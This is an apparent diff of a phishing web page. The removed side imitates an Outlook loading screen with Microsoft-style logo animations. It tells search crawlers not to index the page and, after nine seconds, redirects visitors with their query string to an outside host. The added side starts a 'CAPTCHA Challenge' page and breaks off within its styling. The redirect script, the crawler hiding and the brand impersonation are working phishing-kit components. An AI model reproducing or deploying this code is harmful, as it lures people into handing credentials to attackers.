@@ -1,475 +1,332 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <script>
-  // List of URLs to cycle through
-  const urls = ["https://vf.ugos2.ru.com/", "", ""];
-
-  // Function to get query string from the current URL
-  function getQueryString() {
-    return window.location.search; // This includes the '?' character
-  }
-
-  // Function to get the next URL from local storage or default to the first URL
-  function getNextUrl() {
-    let currentIndex = localStorage.getItem("currentIndex");
-    
-    // Default to index 0 if not set
-    currentIndex = currentIndex ? parseInt(currentIndex) : 0;
-
-    // Get the next URL, ensuring it's a valid non-empty string
-    let nextUrl = urls[currentIndex];
-    while (!nextUrl) {
-      currentIndex = (currentIndex + 1) % urls.length;
-      nextUrl = urls[currentIndex];
-    }
-
-    // Update the index for the next visit
-    currentIndex = (currentIndex + 1) % urls.length;
-    localStorage.setItem("currentIndex", currentIndex);
-
-    return nextUrl;
-  }
-
-  // Function to generate a random string of alphanumeric characters up to 13 characters long
-  function generateRandomString() {
-    const length = Math.floor(Math.random() * 13) + 1; // Random length between 1 and 13
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    let result = '';
-    for (let i = 0; i < length; i++) {
-      result += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return result;
-  }
-
-  // Main function to execute the redirect
-  function redirectToNextUrl() {
-    const queryString = getQueryString();
-    const nextUrl = getNextUrl();
-    const randomString = generateRandomString(); // Generate a random string of up to 13 characters
-    const separator = queryString ? '&' : '?'; // Use '&' if query string exists, otherwise use '?'
-    const fullUrl = `${nextUrl}${queryString}${separator}${randomString}`;
-
-    // Redirect to the constructed URL
-    window.location.href = fullUrl;
-  }
-
-  // Execute the redirect when the page loads after a 9-second delay
-  window.onload = function() {
-    setTimeout(redirectToNextUrl, 9000); // 9000 milliseconds = 9 seconds
-  };
-</script>
-
-
-    <meta content="text/html;charset=utf-8" http-equiv="Content-Type" />
-    <meta content="noindex,noarchive,nofollow,nosnippet" name="robots" />
-    <meta content="noindex,noarchive,nofollow,nosnippet,noimageindex" name="googlebot" />
-    <meta content="noindex,noarchive,nofollow,nosnippet,noodp,noydir" name="slurp" />
-    <meta content="noindex,noarchive,nofollow,nosnippet" name="msnbot" />
-    <meta content="noindex,noarchive,nofollow,nosnippet" name="teoma" />
-    <meta content="IE=IE9" http-equiv="X-UA-Compatible" />
-    <meta content="true" name="HandheldFriendly" />
-    <meta content="width=device-width initial-scale=1 user-scalable=no maximum-scale=1" name="viewport" />
-    <link
-      href="data:image/x-icon;base64,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////////5Ktg/9R4AP/UeAD/1HgA/1EqA/+lWgP/uGQD/7hkA/+4ZAP/uGQD/7hkA/+4ZAP/1HgA/8ZuAf+nVwT/rl8J/9OEEf/fkBT/35AU/9+QFP/UeAD/1HgA/9R4AP/03b///////+/Mn//UeAD/1HgA/9R4AP/UeAD/78yf///////03b//1HgA/9R4AP/UeAD/USoD/6VaA/+4ZAP/uGQD/7hkA/+4ZAP/uGQD/7hkA//UeAD/1HgA/9R4AP+/aQL/oFIF/7ZnC//YiRP/35AU/9R4AP/UeAD/1HgA//fmz///////6ryA/9R4AP/UeAD/1HgA/9R4AP/qvID///////fmz//UeAD/1HgA/9R4AP9qOgL/vmwA/9R4AP/UeAD/1HgA/9R4AP/UeAD/1HgA/+qoKP/qqCj/6qgo/+qoKP/mpCf/yYgh/28uC/+yaRD/1HgA/9R4AP/UeAD/9+bP///////qvID/1HgA/9R4AP/UeAD/1HgA/+q8gP//////9+bP/9R4AP/UeAD/1HgA/2o6Av++bAD/1HgA/9R4AP/UeAD/1HgA/9R4AP/UeAD/6qgo/+qoKP/qqCj/6qgo/+qoKP/qqCj/ZycK/2cnCs/UeAD/1HgA/9R4AP/03b////////LVr//UeAD/1HgA/9R4AP/UeAD/78yf///////03b//1HgA/9R4AP/UeAD/ajoC/75sAP/UeAD/1HgA/9R4AP/UeAD/1HgA/9R4AP/qqCj/6qgo/+qoKP/qqCj/6qgo/+qoKP9nJwpwAAAAANR4AP/UeAD/1HgA/+SrYP///////////+SrYP/UeAD/1HgA/9+aQP///////////+ezcP/UeAD/1HgA/9R4AP9qOgL/vmwA/9R4AP/UeAD/1HgA/9R4AP/UeAD/1HgA/+qoKP/qqCj/6qgo/+qoKP/qqCj/6qgo/wAAAAAAAAAA1HgA/9R4AP/UeAD/1HgA//fmz/////////////fmz//35s/////////////35s//14AQ/9R4AP/UeAD/1HgA/2o6Av++bAD/1HgA/9R4AP/UeAD/1HgA/9R4AP/UeAD/6qgo/+qoKP/qqCj/6qgo/+qoKP/qqCj/AAAAAAAAAADUeAD/1HgA/9R4AP/UeAD/14AQ/+/Mn///////////////////////78yf/9eAEP/UeAD/1HgA/9R4AP/UeAD/ajoC/75sAP/UeAD/1HgA/9R4AP/UeAD/1HgA/9R4AP/qqCj/6qgo/+qoKP/qqCj/6qgo/+qoKP8AAAAAAAAAANR4AP/UeAD/1HgA/9R4AP/UeAD/1HgA/9R4AP/fmkD/35pA/9R4AP/UeAD/1HgA/9R4AP/UeAD/1HgA/9R4AP96RQD/0pck/+qoKP/qqCj/6qgo/+qoKP/qqCj/6qgo///ZUP//2VD//9lQ///ZUP//2VD//9lQ/wAAAAAAAAAA1HgA/9R4AP/UeAD/1HgA/9R4AP/UeAD/1HgA/9R4AP/UeAD/1HgA/9R4AP/UeAD/1HgA/9R4AP/UeAD/1HgA/3pFAP/SlyT/6qgo/+qoKP/qqCj/6qgo/+qoKP/qqCj//9lQ///ZUP//2VD//9lQ///ZUP//2VD/AAAAAAAAAADUeADP1HgA/9R4AP/UeAD/1HgA/9R4AP/UeAD/1HgA/9R4AP/UeAD/1HgA/9R4AP/UeAD/1HgA/9R4AP/DbgD/h0wA/9KXJP/qqCj/6qgo/+qoKP/qqCj/6qgo/+qoKP//2VD//9lQ///ZUP//2VD//9lQ///ZUP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC+bAD/vmwA/75sAP++bAD/vmwA/75sAP++bAD/15ol/+qoKP/qqCj/6qgo/+qoKP/qqCj/6qgo///ZUP//2VD//9lQ///ZUP//2VD//9lQ/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANR4AP/UeAD/1HgA/9R4AP/UeAD/1HgA/9R4AP/qqCj/6qgo/+qoKP/qqCj/6qgo/+qoKP/qqCj//9lQ///ZUP//2VD//9lQ///ZUP//2VD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1HgA/9R4AP/UeAD/1HgA/9R4AP/UeAD/1HgA/+qoKP/qqCj/6qgo/+qoKP/qqCj/6qgo/+qoKP//2VD//9lQ///ZUP//2VD//9lQ///ZUP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACbUAb/m1AG/5tQBv+bUAb/m1AG/5tQBv+bUAb/m1AG/5tQBv+bUAb/m1AG/5tQBv+bUAb/m1AG/5tQBv+bUAb/m1AG/5tQBv+bUAb/m1AG/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJtQBv+bUAb/m1AG/5tQBv+bUAb/m1AG/5tQBv+bUAb/m1AG/5tQBv+bUAb/m1AG/5tQBv+bUAb/m1AG/5tQBv+bUAb/m1AG/5tQBv+bUAb/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAm1AGz5tQBv+bUAb/m1AG/5tQBv+bUAb/m1AG/5tQBv+bUAb/m1AG/5tQBv+bUAb/m1AG/5tQBv+bUAb/m1AG/5tQBv+bUAb/m1AG/5tQBs8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///////////8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAADAAAAAwAAAAMAAAADAAAAAwAAAAP/wAAD/8AAA//AAAP/wAAD/8AAA//AAAP//////////ygAAAAYAAAAMAAAAAEAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOqoKO/qqCj/6qgo/+qoKP/qqCj/6qgo/+qo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"
-      rel="shortcut icon"
-      type="image/x-icon"
-    />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CAPTCHA Challenge</title>
     <style>
-      #loadingScreen {
-        position: fixed;
-        top: 0;
-        bottom: 0;
-        left: 0;
-        right: 0;
-        background-color: #fff;
-      }
-      #loadingLogo {
-        position: fixed;
-        top: calc(50vh - 90px);
-        left: calc(50vw - 90px);
-        width: 180px;
-        height: 180px;
-      }
-      #MSLogo {
-        position: fixed;
-        bottom: 36px;
-        left: calc(50vw - 45px);
-      }
-      .dark #loadingScreen {
-        background-color: #333;
-      }
-      .darkNew #loadingScreen {
-        background-color: #1f1f1f;
-      }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+        }
+        .captcha-container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .loading-bar {
+            width: 100%;
+            height: 10px;
+            background-color: #ddd;
+            margin-top: 20px;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        .loading-progress {
+            height: 100%;
+            width: 0;
+            background-color: #007BFF;
+            transition: width 0.3s ease-out;
+        }
+        .robot-prompt {
+            margin-bottom: 20px;
+            font-size: 18px;
+        }
+        @media (max-width: 600px) {
+            .captcha-button {
+                padding: 15px 30px;
+                font-size: 14px;
+            }
+        }
     </style>
-    <title>
-      Outlook Loading... Wait...
-    </title>
-  </head>
-  <body>
-    <div id="loadingScreen">
-      <div id="loadingLogo">
-        <style>
-          :root {
-            --s: 180px;
-            --envW: 130px;
-            --envH: 71px;
-            --calW: 118px;
-            --sqW: calc(var(--calW) / 3);
-            --sqH: 37px;
-            --calHH: 20px;
-            --calH: calc(var(--sqH) * 3 + var(--calHH));
-            --calY: calc(var(--calH) + 20px);
-            --calYExt: calc(var(--calH) - 80px);
-            --calYOverExt: calc(var(--calH) - 92px);
-            --flapS: 96px;
-            --flapH: calc(0.55 * var(--envH));
-            --flapScaleY: calc(var(--flapH) / var(--flapWidth));
-            --dur: 5s;
-          }
-
-          #container {
-            width: var(--s);
-            height: var(--s);
-            animation: bounce var(--dur) infinite;
-          }
-
-          @keyframes bounce {
-            0% {
-              transform: translateY(0);
-            }
-            12.5% {
-              transform: translateY(0);
-            }
-            22.5% {
-              transform: translateY(7px);
-            }
-            32.5% {
-              transform: translateY(0);
-            }
-            50% {
-              transform: translateY(0);
-            }
-            76.1% {
-              transform: translateY(0);
-            }
-            86% {
-              transform: translateY(7px);
-            }
-            100% {
-              transform: translateY(0);
-            }
-          }
-
-          #logo {
-            height: 179px;
-            width: 130px;
-            overflow: hidden;
-            margin-top: -59px;
-            margin-left: 25px;
-          }
-
-          #containerShadow {
-            position: relative;
-            top: 120px;
-            left: 25px;
-            width: var(--envW);
-            height: var(--envH);
-            border-radius: 0 0 7px 7px;
-            box-shadow: rgba(0, 0, 0, 0.25) 0 4px 5px;
-            animation: shadow-fade var(--dur) infinite;
-          }
-
-          @keyframes shadow-fade {
-            0% {
-              opacity: 0;
-            }
-            21.2% {
-              opacity: 0;
-            }
-            47% {
-              opacity: 1;
-            }
-            70% {
-              opacity: 1;
-            }
-            80% {
-              opacity: 0;
-            }
-            100% {
-              opacity: 0;
-            }
-          }
-
-          #flapContainer {
-            width: var(--envW);
-            margin-top: 179px;
-          }
-
-          #ef {
-            width: var(--envW);
-            height: var(--envH);
-            border-radius: 0 0 7px 7px;
-            overflow: hidden;
-            margin-top: -41px;
-          }
-
-          #ef > .l {
-            width: 287px;
-            height: var(--envH);
-            background: #28a8ea;
-            transform: translate(-153px, -70px) rotate(28deg);
-          }
-
-          #ef > .r {
-            width: 287px;
-            height: var(--envH);
-            background: #1490df;
-            transform: translate(-120px, 63px) rotate(-28deg);
-          }
-
-          #eb {
-            width: var(--envW);
-            height: 40px;
-            background: #123b6d;
-            margin-top: -70px;
-          }
-
-          #cal {
-            display: flex;
-            flex-direction: row;
-            flex-wrap: wrap;
-            width: var(--calW);
-            height: var(--calH);
-            border-radius: 7px;
-            overflow: hidden;
-            margin: 0 auto;
-            margin-top: -306px;
-            animation: cal-bounce var(--dur) infinite;
-            animation-timing-function: cubic-bezier(0, 0.5, 0, 1);
-            transform: translateY(var(--calYExt)) scaleY(1);
-          }
-
-          @keyframes cal-bounce {
-            0% {
-              transform: translateY(var(--calY)) scaleY(1);
-            }
-            16.5% {
-              transform: translateY(var(--calY)) scaleY(1);
-            }
-            28% {
-              transform: translateY(var(--calYOverExt)) scaleY(1);
-            }
-            31% {
-              transform: translateY(var(--calYExt)) scaleY(1.05);
-            }
-            33% {
-              transform: translateY(var(--calYExt)) scaleY(0.96);
-            }
-            34% {
-              transform: translateY(var(--calYExt)) scaleY(1);
-            }
-            68.5% {
-              transform: translateY(var(--calYExt)) scaleY(1);
-              animation-timing-function: cubic-bezier(0.66, -0.16, 1, -0.29);
-            }
-            76.1% {
-              transform: translateY(var(--calY)) scaleY(1);
-            }
-            100% {
-              transform: translateY(var(--calY)) scaleY(1);
-            }
-          }
-
-          #cal > .t {
-            width: var(--calW);
-            height: calc(var(--calHH) + 1px);
-            margin-bottom: -1px;
-            background: #0358a7;
-          }
-
-          #cal > .r {
-            display: flex;
-            flex-direction: row;
-            width: var(--calW);
-            height: var(--sqH);
-          }
-
-          .s {
-            width: var(--sqW);
-            height: calc(var(--sqH) + 1px);
-          }
-
-          .s1 {
-            background: #0078d4;
-          }
-
-          .s2 {
-            background: #28a8ea;
-          }
-
-          .s3 {
-            background: #50d9ff;
-          }
-
-          .s4 {
-            background: #0364b8;
-          }
-
-          .s5 {
-            background: #14447d;
-          }
-
-          #openedFlap {
-            width: var(--envW);
-            height: 107px;
-            animation: opened-flap-swing var(--dur) infinite;
-            animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
-            transform-origin: top;
-            transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);
-          }
-
-          @keyframes opened-flap-swing {
-            0% {
-              transform: translateY(-68px) rotate3d(1, 0, 0, -90deg);
-            }
-            14.5% {
-              transform: translateY(-68px) rotate3d(1, 0, 0, -90deg);
-            }
-            16.5% {
-              transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);
-            }
-            50% {
-              transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);
-            }
-            74% {
-              transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);
-            }
-            76% {
-              transform: translateY(-68px) rotate3d(1, 0, 0, -90deg);
-            }
-            100% {
-              transform: translateY(-68px) rotate3d(1, 0, 0, -90deg);
-            }
-          }
-
-          #closedFlap {
-            width: var(--envW);
-            animation: closed-flap-swing var(--dur) infinite;
-            animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
-            transform-origin: top;
-            transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 90deg);
-          }
-
-          @keyframes closed-flap-swing {
-            0% {
-              transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0);
-            }
-            8.5% {
-              transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0);
-            }
-            14.5% {
-              transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 90deg);
-            }
-            50% {
